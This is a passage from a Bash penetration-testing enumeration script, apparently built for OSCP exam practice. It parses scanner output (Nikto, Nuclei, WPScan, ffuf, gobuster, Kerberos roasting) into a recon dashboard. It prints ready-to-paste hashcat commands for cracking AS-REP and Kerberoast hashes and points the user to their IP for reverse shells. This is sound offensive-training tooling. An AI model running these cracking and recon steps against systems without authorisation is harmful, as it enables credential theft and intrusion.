                    [[ -n "$gb_path" ]] && add_finding "${LGREEN}🟢 200 OK:${NC} ${_gb_base}${gb_path}  ${DIM}[${gb_size:-?}B]${NC}"
                done <<< "$gb_200ok"
                found_something=true
            fi
            local gb_301
            gb_301=$(grep -P 'Status:\s*301' "$file" 2>/dev/null | head -15)
            if [[ -n "$gb_301" ]]; then
                while IFS= read -r gb_line; do
                    local gb_path
                    gb_path=$(echo "$gb_line" | grep -oP '^/\S+' | head -1)
                    [[ -n "$gb_path" ]] && add_finding "${CYAN}🔀 301 DIR:${NC} ${_gb_base}${gb_path}/"
                done <<< "$gb_301"
                found_something=true
            fi
        fi

        # Flag sensitive file extensions (both formats)
        local gb_sensitive
        gb_sensitive=$(grep -iP '(Status:\s*(200|301)|^(200|301)\s)' "$file" 2>/dev/null \
            | grep -iP '\.(bak|old|zip|tar|gz|sql|conf|env|ini|log|swp|sav|orig|dist|tmp)' \
            | head -5)
        if [[ -n "$gb_sensitive" ]]; then
            while IFS= read -r gb_line; do
                local gb_path
                gb_path=$(echo "$gb_line" | grep -oP '(^/\S+|https?://\S+)' | head -1)
                [[ -n "$gb_path" ]] && add_finding "${LRED}🔥 SENSITIVE-FILE $tag:${NC} ${gb_path} — posible info leak"
            done <<< "$gb_sensitive"
            found_something=true
        fi
        # Count total 
        local gb_total
        gb_total=$(grep -cP '(Status:\s*(200|301|302)|^(200|301|302)\s)' "$file" 2>/dev/null)
        if [[ "$gb_total" -gt 0 ]]; then
            local _tool_name="GOBUSTER"
            echo "$file" | grep -qi 'ferox' && _tool_name="FEROXBUSTER"
            add_finding "${CYAN}📊 $_tool_name $tag:${NC} $gb_total rutas totales — ver $(basename "$file")"
        fi
    fi

    # Parse Nikto output — ALL meaningful findings (whitelist approach)
    if echo "$file" | grep -qi 'nikto'; then
        # High-priority: CVEs, vulnerabilities, shellshock, RFI/LFI, config files
        local nikto_critical
        nikto_critical=$(grep -P '^\+ ' "$file" 2>/dev/null \
            | grep -iP 'CVE-|vuln|shellshock|injection|backdoor|credentials|password|config\.php|wp-config|#.*file found|remote (code|file|command)|OSVDB-|exploit' \
            | head -15)
        if [[ -n "$nikto_critical" ]]; then
            while IFS= read -r nk_line; do
                local clean_nk
                clean_nk=$(echo "$nk_line" | sed 's/^+ //' | head -c 120)
                [[ -n "$clean_nk" ]] && add_finding "${LRED}🕷️ NIKTO-CRIT:${NC} $clean_nk"
            done <<< "$nikto_critical"
            found_something=true
        fi
        # Medium-priority: interesting endpoints, methods, server info
        local nikto_medium
        nikto_medium=$(grep -P '^\+ ' "$file" 2>/dev/null \
            | grep -iP 'cgi-bin|/icons/|directory|index|listing|might be interesting|mod_|Server:|outdated|EOL|MultiViews|ETag|inode' \
            | grep -ivP 'Retrieved x-|uncommon header .x-' \
            | head -10)
        if [[ -n "$nikto_medium" ]]; then
            while IFS= read -r nk_line; do
                local clean_nk
                clean_nk=$(echo "$nk_line" | sed 's/^+ //' | head -c 120)
                [[ -n "$clean_nk" ]] && add_finding "${YELLOW}🕷️ NIKTO $tag:${NC} $clean_nk"
            done <<< "$nikto_medium"
            found_something=true
        fi
        # Count total nikto findings
        local nk_total
        nk_total=$(grep -cP '^\+ ' "$file" 2>/dev/null || echo 0)
        if [[ "$nk_total" -gt 0 ]]; then
            add_finding "${CYAN}📊 NIKTO $tag:${NC} $nk_total hallazgos totales — ver $(basename "$file")"
        fi
    fi

    # Parse Nuclei output — template findings
    # Real format: [template-id] [protocol] [severity] URL [extra-info]
    if echo "$file" | grep -qi 'nuclei'; then
        # Critical/High findings
        local nuc_critical
        nuc_critical=$(grep -iP '\[critical\]|\[high\]' "$file" 2>/dev/null | head -15)
        if [[ -n "$nuc_critical" ]]; then
            while IFS= read -r nuc_line; do
                local nuc_clean
                nuc_clean=$(echo "$nuc_line" | head -c 130)
                [[ -n "$nuc_clean" ]] && add_finding "${LRED}☢️ NUCLEI-CRIT:${NC} $nuc_clean"
            done <<< "$nuc_critical"
            found_something=true
        fi
        # Medium findings
        local nuc_medium
        nuc_medium=$(grep -iP '\[medium\]' "$file" 2>/dev/null | grep -viP '\[critical\]|\[high\]' | head -10)
        if [[ -n "$nuc_medium" ]]; then
            while IFS= read -r nuc_line; do
                local nuc_clean
                nuc_clean=$(echo "$nuc_line" | head -c 130)
                [[ -n "$nuc_clean" ]] && add_finding "${YELLOW}☢️ NUCLEI:${NC} $nuc_clean"
            done <<< "$nuc_medium"
            found_something=true
        fi
        # Info/Low — just count
        local nuc_total
        nuc_total=$(wc -l < "$file" 2>/dev/null || echo 0)
        if [[ "$nuc_total" -gt 0 ]]; then
            add_finding "${CYAN}📊 NUCLEI $tag:${NC} $nuc_total hallazgos totales — ver $(basename "$file")"
        fi
    fi

    # Parse wpscan output — vulnerable plugins, themes, users
    if echo "$file" | grep -qi 'wpscan'; then
        local wp_vulns
        wp_vulns=$(grep -iP '^\s*\|.*Vuln|Title:|Fixed in:' "$file" 2>/dev/null | head -10)
        if [[ -n "$wp_vulns" ]]; then
            while IFS= read -r wp_line; do
                local clean_wp
                clean_wp=$(echo "$wp_line" | sed 's/^[| ]*//' | head -c 120)
                [[ -n "$clean_wp" ]] && add_finding "${LRED}🔌 WPSCAN-VULN:${NC} $clean_wp"
            done <<< "$wp_vulns"
            found_something=true
        fi
        # Users found
        local wp_users
        # Extract usernames explicitly from WPScan 'User(s) Identified' block
        wp_users=$(grep -iA 30 'User(s) Identified:' "$file" 2>/dev/null | grep -oP '^\[\+\] \K[a-zA-Z0-9_.-]+' | sort -u | head -8 | tr '\n' ',' | sed 's/,$//')
        if [[ -n "$wp_users" ]]; then
            add_finding "${YELLOW}👤 WPSCAN USERS:${NC} $wp_users"
            found_something=true
        fi
    fi

    # Parse AS-REP Roasting output — crackable hashes
    if echo "$file" | grep -qi 'asrep'; then
        if grep -q '\$krb5asrep' "$file" 2>/dev/null; then
            local asrep_count
            asrep_count=$(grep -c '\$krb5asrep' "$file" 2>/dev/null)
            add_finding "${LRED}🎯 AS-REP ROASTING: $asrep_count hashes crackeables encontrados!${NC}"
            add_finding "💡 HACK: Crack AS-REP → hashcat -m 18200 asrep_hashes.txt rockyou.txt"
            found_something=true
        fi
    fi

    # Parse Kerberoasting output — TGS hashes
    if echo "$file" | grep -qi 'kerberoast'; then
        if grep -q '\$krb5tgs\$' "$file" 2>/dev/null; then
            local tgs_count
            tgs_count=$(grep -c '\$krb5tgs\$' "$file" 2>/dev/null)
            add_finding "${LRED}🎯 KERBEROASTING: $tgs_count TGS hashes crackeables encontrados!${NC}"
            add_finding "💡 HACK: Crack TGS → hashcat -m 13100 kerberoast_hashes.txt rockyou.txt"
            found_something=true
        fi
    fi

    # Parse ffuf output — LFI hits and parameter discovery
    # ffuf terminal format: path  [Status: 200, Size: 1234, Words: 56, Lines: 78, Duration: 123ms]
    if echo "$file" | grep -qi 'ffuf'; then
        # Build base URL from filename for display
        local _ff_port
        _ff_port=$(echo "$file" | grep -oP 'port\K\d+' || echo "80")
        local _ff_proto="http"
        [[ "$_ff_port" == "443" || "$_ff_port" == "8443" ]] && _ff_proto="https"
        local _ff_base="${_ff_proto}://${IP}"
        [[ "$_ff_port" != "80" && "$_ff_port" != "443" ]] && _ff_base="${_ff_base}:${_ff_port}"

        # Parse all results with Status 200 (ffuf already filtered, so every hit matters)
        local ffuf_hits
        ffuf_hits=$(grep -P '\[Status:\s*200' "$file" 2>/dev/null | head -20)
        if [[ -n "$ffuf_hits" ]]; then
            local ffuf_hit_count=0
            while IFS= read -r ff_line; do
                local ff_path ff_size
                ff_path=$(echo "$ff_line" | awk '{print $1}' | head -1)
                ff_size=$(echo "$ff_line" | grep -oP 'Size:\s*\K\d+' | head -1)
                if [[ -n "$ff_path" && "$ff_path" != "*" ]]; then
                    # Classify: LFI file has lfi/param in name, parameter file has params
                    if echo "$file" | grep -qi 'lfi'; then
                        add_finding "${LRED}💉 FFUF-LFI:${NC} ${_ff_base}/${ff_path}  ${DIM}[${ff_size:-?}B]${NC}"
                    else
                        add_finding "${YELLOW}🔎 FFUF-PARAM:${NC} ${_ff_base}/${ff_path}  ${DIM}[${ff_size:-?}B]${NC}"
                    fi
                    ((ffuf_hit_count++))
                fi
            done <<< "$ffuf_hits"
            found_something=true
        fi

        # Also check for manually parseable ffuf JSON results (if -of json was used)
        local ffuf_json_hits
        ffuf_json_hits=$(grep -oP '"input":\s*\{"FUZZ":"[^"]*"\}' "$file" 2>/dev/null | head -10)
        if [[ -n "$ffuf_json_hits" ]]; then
            while IFS= read -r ff_json; do
                local ff_fuzz
                ff_fuzz=$(echo "$ff_json" | grep -oP '"FUZZ":"[^"]*"' | sed 's/"FUZZ":"//' | sed 's/"$//')
                if [[ -n "$ff_fuzz" ]]; then
                    if echo "$file" | grep -qi 'lfi'; then
                        add_finding "${LRED}💉 FFUF-LFI:${NC} ${_ff_base}/${ff_fuzz}"
                    else
                        add_finding "${YELLOW}🔎 FFUF-PARAM:${NC} ${ff_fuzz}"
                    fi
                fi
            done <<< "$ffuf_json_hits"
            found_something=true
        fi

        # Count total hits
        local ffuf_total
        ffuf_total=$(grep -cP '\[Status:\s*200' "$file" 2>/dev/null)
        if [[ "$ffuf_total" -gt 0 ]]; then
            local _ff_type="FFUF"
            echo "$file" | grep -qi 'lfi' && _ff_type="FFUF-LFI"
            echo "$file" | grep -qi 'param' && _ff_type="FFUF-PARAMS"
            add_finding "${CYAN}📊 $_ff_type $tag:${NC} $ffuf_total resultados — ver $(basename "$file")"
        fi
    fi

    $found_something && echo ""
}
_ts()         { date '+%H:%M:%S'; }
log_info()    { echo -e "  ${CYAN}[*]${NC} $1"; [[ -n "$SESSION_LOG" ]] && echo "[$(_ts)] [INFO]  $1" >> "$SESSION_LOG"; }
log_ok()      { echo -e "  ${LGREEN}[+]${NC} $1"; [[ -n "$SESSION_LOG" ]] && echo "[$(_ts)] [OK]    $1" >> "$SESSION_LOG"; }
log_warn()    { echo -e "  ${YELLOW}[!]${NC} $1"; [[ -n "$SESSION_LOG" ]] && echo "[$(_ts)] [WARN]  $1" >> "$SESSION_LOG"; }
log_error()   { echo -e "  ${LRED}[-]${NC} $1"; [[ -n "$SESSION_LOG" ]] && echo "[$(_ts)] [ERROR] $1" >> "$SESSION_LOG"; }
log_run()     { echo -e "  ${PURPLE}[>]${NC} ${DIM}$1${NC}"; [[ -n "$SESSION_LOG" ]] && echo "[$(_ts)] [RUN]   $1" >> "$SESSION_LOG"; log_evidence "$1" "Foreground"; }
log_section() { echo -e "\n  ${LBLUE}${BOLD}---------------------- $1 ----------------------${NC}\n"; }
separator()   { echo -e "  ${BLUE}--------------------------------------------------------${NC}"; }

# -- Dashboard live refresher --------------------------------------------------
declare -A PARSED_FILES_MTIME=()

refresh_dashboard_data() {
    [[ -z "$LOOT_DIR" || ! -d "$LOOT_DIR" ]] && return
    # Restore any findings persisted from previous runs (idempotent)
    load_findings_cache

    # Silently parse ALL scan output files to repopulate FINDINGS array live
    # Optimized: Only parses files that have been modified since last check
    local _dirs=("scans" "web" "smb" "ftp" "dns" "mail" "db" "remote" "exploit" "ldap")
    for _d in "${_dirs[@]}"; do
        if [[ -d "$LOOT_DIR/$_d" ]]; then
            for f in "$LOOT_DIR/$_d"/*.txt "$LOOT_DIR/$_d"/*.nmap; do
                if [[ -f "$f" ]]; then
                    local _mtime
                    _mtime=$(stat -c%Y "$f" 2>/dev/null || echo 0)
                    if [[ "${PARSED_FILES_MTIME["$f"]}" != "$_mtime" ]]; then
                        parse_scan_findings "$f" "${_d^}" >/dev/null 2>&1
                        PARSED_FILES_MTIME["$f"]="$_mtime"
                    fi
                fi
            done
        fi
    done
}

# -- Banner + Intelligence Dashboard -------------------------------------------
banner() {
    refresh_dashboard_data
    clear

    # OS badge colour: green for Linux, cyan for Windows, yellow for unknown
    local os_color="$YELLOW"
    [[ "$OS_TARGET" == "Linux"   ]] && os_color="$LGREEN"
    [[ "$OS_TARGET" == "Windows" ]] && os_color="$LCYAN"

    echo -e "${LRED}"
    echo '   ___  ____   ____ ____     _____ _   _ _   _ __  __ '
    echo '  / _ \/ ___| / ___|  _ \   | ____| \ | | | | |  \/  |'
    echo ' | | | \___ \| |   | |_) |  |  _| |  \| | | | | |\/| |'
    echo ' | |_| |___) | |___|  __/   | |___| |\  | |_| | |  | |'
    echo '  \___/|____/ \____|_|      |_____|_| \_|\___/|_|  |_|'
    echo '                                                      '
    echo -e "${NC}"
    echo -e "${LCYAN}              .--."
    echo    '             |o_o |'
    echo    '             |:_/ |'
    echo -e "${CYAN}            //   ||  "  
    echo    '           (|     | )'
    echo -e "${LCYAN}           (-_-)   "
    echo    "          (___)==(___)"
    echo -e "${NC}"
    echo -e "    ${GREEN}+-----------------------------------------------+${NC}"
    echo -e "    ${GREEN}|${NC}  ${LGREEN}>_${NC} ${WHITE}\$ ./oscp_enum.sh <TARGET>${NC}               ${GREEN}|${NC}"
    echo -e "    ${GREEN}|${NC}  ${DIM}[*] Initializing recon framework...${NC}      ${GREEN}|${NC}"
    echo -e "    ${GREEN}|${NC}  ${LRED}[!] No mercy. All recon.${NC}                 ${GREEN}|${NC}"
    echo -e "    ${GREEN}+-----------------------------------------------+${NC}"
    echo -e "  ${YELLOW}${BOLD}  * OSCP Enumeration Script v3.0 - by acanoman *${NC}"

    # ---------------------------------------------------------------------------
    # RECON DASHBOARD
    # ---------------------------------------------------------------------------
    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------+${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}>> RECON DASHBOARD${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------+${NC}"

    # Row 1: Target + OS + Domain
    printf "  ${LPURPLE}|${NC}  ${CYAN}Target:${NC} ${WHITE}%-17s${NC}" "${IP:-<not set>}"
    printf "${CYAN}OS:${NC} ${os_color}%s${NC}   " "${OS_ICON} ${OS_TARGET}"
    printf "${CYAN}Domain:${NC} ${WHITE}%s${NC}\n" "${DOMAIN:-<none>}"

    # Row 1b: Attacker's own IP (tun0 VPN preferred, fallback eth0)
    local attacker_ip
    attacker_ip=$(get_attacker_ip)
    printf "  ${LPURPLE}|${NC}  ${LRED}* Attacker:${NC} ${LGREEN}%-15s${NC}" "$attacker_ip"
    printf "${DIM}%s${NC}\n" "  (tun0/eth0 — usa esta IP en tus reverse shells)"

    # Row 2: TCP ports with versions (compact and wrapped)
    if [[ ${#SERVICES_VERSION[@]} -gt 0 ]]; then
        local current_len=0
        printf "  ${LPURPLE}|${NC}  ${CYAN}TCP:${NC} "
        for sv in "${SERVICES_VERSION[@]}"; do
            local _p=${sv%%:*}; local rest=${sv#*:}; local _s=${rest%%:*}; local _v=${rest#*:}
            local segment_text
            local segment_ansi
            
            if [[ -n "$_v" && "$_v" != "$_s" ]]; then
                segment_text="${_p}/${_s}(${_v}) "
                segment_ansi="${GREEN}${_p}${NC}/${_s}(${DIM}${_v}${NC}) "
            else
                segment_text="${_p}/${_s} "
                segment_ansi="${GREEN}${_p}${NC}/${_s} "
            fi
            
            if (( current_len + ${#segment_text} > 60 )); then
                echo ""
                printf "  ${LPURPLE}|${NC}       "
                current_len=0
            fi
            printf "%b" "$segment_ansi"
            current_len=$(( current_len + ${#segment_text} ))
        done
        echo ""
    elif [[ -n "$PORTS" ]]; then
        printf "  ${LPURPLE}|${NC}  ${CYAN}TCP:${NC} ${WHITE}%s${NC}\n" "$PORTS"
    else
        printf "  ${LPURPLE}|${NC}  ${CYAN}TCP:${NC} ${DIM}%s${NC}\n" "<not scanned>"
    fi

    # Row 3: UDP ports
    if [[ -n "$PORTS_UDP" ]]; then
        printf "  ${LPURPLE}|${NC}  ${CYAN}UDP:${NC} ${YELLOW}%s${NC}\n" "$PORTS_UDP"
    fi

    # Row 4: CMS + Creds
    if [[ -n "$CMS_DETECTED" || -n "$USER_CRED" ]]; then
        printf "  ${LPURPLE}|${NC}  "
        [[ -n "$CMS_DETECTED" ]] && printf "${CYAN}CMS:${NC} ${LRED}%s${NC}   " "$CMS_DETECTED"
        [[ -n "$USER_CRED" ]] && printf "${CYAN}Creds:${NC} ${LGREEN}%s${NC}" "$USER_CRED / ***"
        echo ""
    fi

    # Row 5: Discovered domains
    if [[ ${#DOMAINS_FOUND[@]} -gt 0 ]]; then
        local dom_line=""
        for d in "${DOMAINS_FOUND[@]}"; do
            dom_line+="$d "
        done
        printf "  ${LPURPLE}|${NC}  ${CYAN}Domains:${NC} ${WHITE}%s${NC}\n" "$dom_line"
    fi

    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"

    # Critical findings section
    local has_any_findings=false
    if [[ ${#FINDINGS[@]} -gt 0 ]]; then
        
        # Helper content to print categorized findings
        print_cat() {
            local title="$1"
            local rx="$2"
            local limit="$4"
            local count=0
            local hp=false
            for f in "${FINDINGS[@]}"; do
                if echo "$f" | grep -qiE "^$rx" 2>/dev/null || echo "$f" | grep -qiE "$rx" 2>/dev/null; then
                    if ! $hp; then
                        echo -e "  ${LPURPLE}|${NC}    ${LRED}${BOLD}${title}${NC}"
                        hp=true
                        has_any_findings=true
                    fi
                    echo -e "  ${LPURPLE}|${NC}      -> ${f}"
                    ((count++))
                    [[ $count -ge $limit ]] && break
                fi
            done
        }

        # Determine which master blocks to print
        local print_creds=false print_web=false print_sys=false print_hack=false
        for f in "${FINDINGS[@]}"; do
            if echo "$f" | grep -qiE 'CREDENCIAL|🔑|SSH KEYS|SENSITIVE-FILE|🔥'; then print_creds=true; fi
            if echo "$f" | grep -qiE 'NUCLEI-CRIT|☢️|NIKTO-CRIT|🕷️|FFUF|💉|WPSCAN-VULN|👤 WPSCAN'; then print_web=true; fi
            if echo "$f" | grep -qiE 'CVE-|VULNERABLE|💥|🔴|AS-REP'; then print_sys=true; fi
            if echo "$f" | grep -qiE '💡 HACK:'; then print_hack=true; fi
        done

        if $print_hack; then
            echo -e "  ${LPURPLE}|${NC}  ${CYAN}${BOLD}[ 📋 MANUAL ACTIONS RECOMMENDED ]${NC}"
            echo -e "  ${LPURPLE}|${NC}    ${LRED}${BOLD}? RECETAS LISTAS PARA USAR (Copiar y pegar):${NC}"
            for f in "${FINDINGS[@]}"; do
                if echo "$f" | grep -qiE '💡 HACK:'; then
                    local _clean_hack
                    _clean_hack=$(echo "$f" | sed -E 's/^.*💡 HACK:[[:space:]]*//' | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
                    echo -e "  ${LPURPLE}|${NC}      -> ${_clean_hack}"
                fi
            done
            echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
        fi

        if $print_creds; then
            echo -e "  ${LPURPLE}|${NC}  ${CYAN}${BOLD}[ 🔑 SECRETS & FAST WINS ]${NC}"
            print_cat "⚠ CREDENCIALES:" 'CREDENCIAL|🔑|SSH KEYS' "" 8
            print_cat "⚠ ARCHIVOS SENSIBLES:" 'SENSITIVE-FILE|🔥' "" 8
        fi

        if $print_web; then
            echo -e "  ${LPURPLE}|${NC}  ${CYAN}${BOLD}[ 🌐 WEB VULNERABILITIES ]${NC}"
            print_cat "⚠ NUCLEI:" 'NUCLEI-CRIT|☢️' "" 8
            print_cat "⚠ NIKTO:" 'NIKTO-CRIT|🕷️' "" 8
            print_cat "⚠ FFUF LFI:" 'FFUF-LFI|💉' "" 8
            print_cat "⚠ WPSCAN:" 'WPSCAN-VULN|👤 WPSCAN' "" 8
        fi

        if $print_sys; then
            echo -e "  ${LPURPLE}|${NC}  ${CYAN}${BOLD}[ 🖥 SYSTEM & AD VULNERABILITIES ]${NC}"
            print_cat "⚠ NMAP CVEs:" 'CVE-|VULNERABLE|💥|🔴' "" 8
            print_cat "⚠ ACTIVE DIRECTORY:" 'AS-REP' "" 8
        fi

        # Show General findings if we printed nothing critical
        if ! $has_any_findings; then
            echo -e "  ${LPURPLE}|${NC}  ${YELLOW}${BOLD}FINDINGS (${#FINDINGS[@]} total):${NC}"
            local _start=$(( ${#FINDINGS[@]} > 5 -> ${#FINDINGS[@]} - 5 : 0 ))
            for (( _i=_start; _i<${#FINDINGS[@]}; _i++ )); do
                echo -e "  ${LPURPLE}|${NC}    ${CYAN}?${NC} ${FINDINGS[$_i]}"
            done
        else
            echo -e "  ${LPURPLE}|${NC}  ${DIM}${#FINDINGS[@]} total findings -> use [M] for full list${NC}"
        fi
    else
        echo -e "  ${LPURPLE}|${NC}  ${DIM}No findings yet → run [A] Auto-Recon to start${NC}"
    fi

    # -- Auto-Recon Progress (reads .status/ files) ------------------------
    if [[ -d "$LOOT_DIR/.status" ]] && ls "$LOOT_DIR/.status/"*.status &>/dev/null; then
        echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${BOLD}📊 PROGRESO AUTO-RECON${NC}"
        local _done_count=0 _total_steps=0 _running_count=0 _skip_count=0
        for _sf in "$LOOT_DIR/.status"/s*.status; do
            [[ -f "$_sf" ]] || continue
            ((_total_steps++))
            local _sline _sstatus _sstart _sname _send _icon _time_str=""
            _sline=$(head -1 "$_sf")
            _sstatus=$(echo "$_sline" | cut -d'|' -f1)
            _sstart=$(echo "$_sline" | cut -d'|' -f2)
            _sname=$(echo "$_sline" | cut -d'|' -f3)
            _send=$(echo "$_sline" | cut -d'|' -f4)
            local _stepnum
            _stepnum=$(basename "$_sf" .status | sed 's/s0*//')
            case "$_sstatus" in
                DONE)
                    _icon="✅"
                    ((_done_count++))
                    if [[ -n "$_send" && "$_send" -gt 0 && "$_sstart" -gt 0 ]] 2>/dev/null; then
                        local _dur=$(( _send - _sstart ))
                        _time_str="${_dur}s"
                        [[ $_dur -ge 60 ]] && _time_str="$((_dur/60))m $((_dur%60))s"
                    fi
                    ;;
                RUNNING)
                    _icon="⏳"
                    ((_running_count++))
                    if [[ "$_sstart" -gt 0 ]] 2>/dev/null; then
                        local _now _dur
                        _now=$(date +%s)
                        _dur=$(( _now - _sstart ))
                        _time_str="${_dur}s"
                        [[ $_dur -ge 60 ]] && _time_str="$((_dur/60))m $((_dur%60))s"
                    fi
                    ;;
                SKIPPED)
                    _icon="⏭️"
                    ((_skip_count++))
                    _time_str="$_send"  # reason is in 4th field
                    ;;
            esac
            printf "  ${LPURPLE}|${NC}   %s ${WHITE}%2s.${NC} %-22s ${DIM}%s${NC}\n" \
                "$_icon" "$_stepnum" "${_sname:0:22}" "${_time_str}"
        done
        # Summary line
        local _pend=$(( 20 - _done_count - _running_count - _skip_count ))
        [[ $_pend -lt 0 ]] && _pend=0
        printf "  ${LPURPLE}|${NC}  ${GREEN}✅%d${NC} ${YELLOW}⏭%d${NC} ${DIM}⏳%d${NC} ${CYAN}📋%d pendientes${NC}\n" \
            "$_done_count" "$_running_count" "$_skip_count" "$_pend"
    fi

    # -- Credentials from findings -----------------------------------------
    local _has_creds=false
    for f in "${FINDINGS[@]}"; do
        if echo "$f" | grep -qiE '🔑|CREDENCIAL|CRED.*VÁLID|password'; then
            if ! $_has_creds; then
                echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
                echo -e "  ${LPURPLE}|${NC}  ${LGREEN}${BOLD}🔑 CREDENCIALES ENCONTRADAS${NC}"
                _has_creds=true
            fi
            echo -e "  ${LPURPLE}|${NC}   ${f}"
        fi
    done
    [[ -n "$USER_CRED" && -n "$PASS_CRED" ]] && ! $_has_creds && {
        echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${LGREEN}${BOLD}🔑 CREDENCIALES ACTIVAS${NC}"
        printf "  ${LPURPLE}|${NC}   ${LGREEN}%s${NC}:${LGREEN}%s${NC}\n" "$USER_CRED" "$PASS_CRED"
    }

    # -- Background Tasks (tmux) -------------------------------------------
    if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
        local win_count _finished_count=0
        win_count=$(tmux list-windows -t "$TMUX_SESSION" 2>/dev/null | wc -l)
        echo -e "  ${LPURPLE}|${NC}  ${CYAN}${BOLD}⚙ TAREAS EN BACKGROUND${NC} (${LGREEN}${win_count}${NC})"
        local _wins_to_kill=()
        while IFS= read -r win_line; do
            local _wname _wpane_cmd _wstatus_icon _wstatus_text _elapsed=""
            _wname="$win_line"
            _wpane_cmd=$(tmux display-message -p -t "${TMUX_SESSION}:${_wname}" '#{pane_current_command}' 2>/dev/null || echo "?")
            local _pane_start
            _pane_start=$(tmux display-message -p -t "${TMUX_SESSION}:${_wname}" '#{pane_start_time}' 2>/dev/null || echo "0")
            if [[ "$_pane_start" -gt 0 ]] 2>/dev/null; then
                local _now _diff _mins _secs
                _now=$(date +%s)
                _diff=$(( _now - _pane_start ))
                _mins=$(( _diff / 60 ))
                _secs=$(( _diff % 60 ))
                _elapsed="${_mins}m ${_secs}s"
            fi
            if [[ "$_wpane_cmd" == "bash" || "$_wpane_cmd" == "zsh" || "$_wpane_cmd" == "sh" ]]; then
                _wstatus_icon="✅"
                _wstatus_text="completado"
                _wins_to_kill+=("$_wname")
                ((_finished_count++))
            else
                _wstatus_icon="⏳"
                _wstatus_text="corriendo — ${_elapsed}"
            fi
            printf "  ${LPURPLE}|${NC}    ${_wstatus_icon} %-14s ${DIM}%s${NC}\n" \
                "$_wname" "$_wstatus_text"
        done < <(tmux list-windows -t "$TMUX_SESSION" -F '#{window_name}' 2>/dev/null)
        # Auto-cleanup finished windows
        if [[ ${#_wins_to_kill[@]} -gt 0 && $win_count -gt ${#_wins_to_kill[@]} ]]; then
            for _wk in "${_wins_to_kill[@]}"; do
                tmux kill-window -t "${TMUX_SESSION}:${_wk}" 2>/dev/null
            done
        elif [[ ${#_wins_to_kill[@]} -eq $win_count && $win_count -gt 0 ]]; then
            tmux kill-session -t "$TMUX_SESSION" 2>/dev/null
        fi
    else
        echo -e "  ${LPURPLE}|${NC}  ${CYAN}Background Tasks:${NC} ${DIM}none${NC}"
    fi

    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo ""
}

# -- Guards --------------------------------------------------------------------
require_ip() {
    if [[ -z "$IP" ]]; then
        log_error "Target IP not configured. Go to [0] Setup first."
        echo ""; read -rp "  Press ENTER to continue..." ; return 1
    fi
    return 0
}

require_loot() {
    if [[ -z "$LOOT_DIR" ]]; then
        log_error "Loot directory not initialised. Run [0] Setup first."
        echo ""; read -rp "  Press ENTER to continue..." ; return 1
    fi
    return 0
}

require_ports() {
    if [[ -z "$PORTS" ]]; then
        log_warn "No ports scanned yet. Run [2] Fast Port Scan or [A] Auto-Recon first."
        echo ""; read -rp "  Press ENTER to continue..." ; return 1
    fi
    return 0
}

check_tool() {
    command -v "$1" &>/dev/null \
        && echo -e "  ${GREEN}[✓]${NC} $1" \
        || echo -e "  ${RED}[✗]${NC} $1 ${YELLOW}(not installed)${NC}"
}

# -- OSCP Evidence Logger ------------------------------------------------------
log_evidence() {
    [[ -z "$LOOT_DIR" || ! -d "$LOOT_DIR" ]] && return
    local cmd="$1"
    local run_type="${2:-Foreground}"
    local log_file="$LOOT_DIR/OSCP_Commands_Log.md"
    
    if [[ ! -f "$log_file" ]]; then
        echo "# 🛡️ OSCP Active Commands Evidence Log" > "$log_file"
        echo "**Target IP:** $IP" >> "$log_file"
        echo "> Auto-generated track of all commands executed during enumeration." >> "$log_file"
        echo "---" >> "$log_file"
    fi
    # Only log actual bash commands (strip leading echos if they are purely decorative)
    local _clean_cmd="${cmd}"
    # Remove leading echo '[*]...' if presents (tmux wrapper)
    local re="^echo .*; (.*)$"
    if [[ "$_clean_cmd" =~ $re ]]; then
        _clean_cmd="${BASH_REMATCH[1]}"
    fi
    
    if [[ -n "$_clean_cmd" ]]; then
        echo "### [$(_ts)] Execution ($run_type)" >> "$log_file"
        echo '```bash' >> "$log_file"
        echo "$_clean_cmd" >> "$log_file"
        echo '```' >> "$log_file"
        echo "" >> "$log_file"
    fi
}

# -- Run command (foreground, with tee) ----------------------------------------
run_cmd() {
    # run_cmd "description" "shell command" ["/path/to/outfile"]
    local cmd="$2"; local outfile="$3"
    log_run "$cmd"
    log_evidence "$cmd" "Foreground"
    if [[ -n "$outfile" ]]; then
        eval "$cmd" 2>&1 | tee "$outfile"
    else
        eval "$cmd" 2>&1
    fi
    echo ""
}

# =============================================================================
# -- UPGRADE 3: Tmux background runner -----------------------------------------
# =============================================================================
# tmux_run "WindowName" "full shell command"
# Opens (or reuses) a tmux session and creates a named window for the task.
# If not inside tmux, also prints instructions on how to attach.
tmux_run() {
    local win_name="$1"
    local cmd="$2"
    local out_hint="${3:-}"          # optional: path to tail for live view hint

    log_evidence "$cmd" "Tmux Background"

    # Bootstrap the session if needed
    if ! tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        tmux new-session -d -s "$TMUX_SESSION" -x 220 -y 50
        log_info "Created tmux session: ${WHITE}$TMUX_SESSION${NC}"
    fi

    # Kill existing window with the same name to avoid duplicates on re-run
    tmux kill-window -t "${TMUX_SESSION}:${win_name}" 2>/dev/null

    tmux new-window -t "$TMUX_SESSION" -n "$win_name" \
        "echo ''; echo '  [>] Comenzando tarea: $win_name'; echo ''; \
         $cmd 2>&1 | tee ${LOOT_DIR:-.}/.tmux_${win_name}.log; \
         _exit_code=\$?; \
         if [ \$_exit_code -ne 0 ]; then \
           echo ''; echo '  [!] ERROR: Tarea fall (exit code '\$_exit_code')'; \
           echo '  [!] Revisa el log: ${LOOT_DIR:-.}/.tmux_${win_name}.log'; \
           sleep 30; \
         else \
           echo ''; echo '  [DONE] Tarea completada.'; sleep 3; \
         fi"

    log_ok "Background task launched in tmux window ${WHITE}[$win_name]${NC}"

    if [[ -n "$TMUX" ]]; then
